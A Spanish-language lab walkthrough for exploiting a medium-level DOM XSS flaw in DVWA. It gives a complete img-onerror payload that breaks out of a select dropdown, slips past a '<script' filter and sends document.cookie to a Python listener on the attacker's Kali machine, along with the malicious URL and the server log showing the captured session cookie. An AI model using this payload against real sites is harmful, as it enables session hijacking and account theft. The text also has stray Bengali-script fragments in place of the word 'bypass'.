# Explotación de Vulnerabilidad XSS (Cross-Site Scripting) - Nivel Medio

## Objetivo

Robar la cookie de un usuario conectado explotando una vulnerabilidad Cross-Site Scripting (XSS) de nivel medio.

## Herramientas Necesarias

* Un entorno web vulnerable (por ejemplo, DVWA - Damn Vulnerable Web Application).
* Kali Linux (o cualquier sistema con Python instalado).

## Pasos para la Explotación

1.  **Iniciar un servidor web temporal en Kali Linux:**
    Abre tu terminal en Kali Linux y ejecuta el siguiente comando para iniciar un servidor web simple en el puerto 9999. Este servidor escuchará las peticiones que envíe la página vulnerable.

    ```bash
    sudo python3 -m http.server 9999
    ```

2.  **Analizar las protecciones de nivel Medio:**
    A diferencia del nivel Bajo, el nivel Medio bloquea la cadena `<script`. Esto significa que los payloads directos que utilizaban la etiqueta `<script>` ya no funcionarán.

3.  **Construir un payload XSS sin la etiqueta `<script>`:**
    Para বাইপাসar esta restricción, utilizaremos la etiqueta `<img>` con un evento `onerror` para ejecutar código JavaScript.

4.  **Payload final para robar la cookie:**
    Dado que la entrada se inyecta en la primera opción de un desplegable (`<select>`), necesitamos "romper" la estructura HTML del dropdown para que nuestra etiqueta `<img>` se renderice correctamente y el código JavaScript se ejecute. El siguiente payload logra esto:

    ```html
    </option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")>
    ```

    **Desglose del payload:**

    * `</option></select>`: Cierra la etiqueta `<option>` actual y la etiqueta `<select>` del desplegable, sacándonos de su estructura.
    * `<img id='pic'`: Crea una etiqueta `<img>` con el ID `pic`.
    * `src=x`: Establece un valor inválido para el atributo `src`. Cualquier valor no válido para una imagen provocará un error.
    * `onerror="..."`: Define el código JavaScript que se ejecutará cuando ocurra un error al cargar la imagen (debido al `src` inválido).
        * `var i = document.getElementById('pic');`: Obtiene la referencia al elemento `<img>` por su ID.
        * `i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie);`: Establece el atributo `src` de la imagen a una URL en tu servidor web temporal (reemplaza `[tu_IP_de_Kali]` con la IP de tu máquina Kali) seguido de la cookie del usuario (`document.cookie`). Esto hará que el navegador de la víctima intente cargar una "imagen" desde tu servidor, enviando la cookie en la petición GET.
        * `i.parentNode.removeChild(i);`: Elimina la etiqueta `<img>` del DOM para evitar que el evento `onerror` se siga disparando repetidamente, lo que podría generar múltiples peticiones a tu servidor.
        * `return false;`: Evita que el error de la imagen se propague.
    * `>`: Cierra la etiqueta `<img>`.

5.  **Construir la URL maliciosa:**
    Combina la URL de la página vulnerable con el payload inyectado en el parámetro `default`:

    ```
    http://dvwa/dvwa/vulnerabilities/xss_d/?default=English</option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")>
    ```

    **¡Importante!** Reemplaza `[tu_IP_de_Kali]` con la dirección IP de tu máquina Kali.

6.  **Acceder a la URL maliciosa:**
    Pega esta URL en el navegador de la víctima (o en tu propio navegador si estás probando la vulnerabilidad).

7.  **Verificar el servidor web temporal:**
    Si la explotación es exitosa, tu servidor web temporal en Kali Linux debería recibir una petición GET. La ruta de esta petición contendrá la cookie del usuario conectado. Deberías ver algo similar a esto en los logs de tu servidor:

    ```
    192.168.x.x - - [DD/Mon/YYYY HH:MM:SS] "GET /PHPSESSID=alguna_sesion;security=medium HTTP/1.1" 200 -
    ```

    La parte después de `/` es la cookie del usuario.

## ¡Felicidades!

Has explotado con éxito la vulnerabilidad XSS de nivel Medio para robar la cookie de un usuario utilizando un payload que বাইপাসa la restricción de la etiqueta `<script>`.

**Recuerda:** Esta demostración es con fines educativos en un entorno controlado. En escenarios reales, las protecciones pueden ser más robustas. El uso de esta información para actividades maliciosas es ilegal y no ético.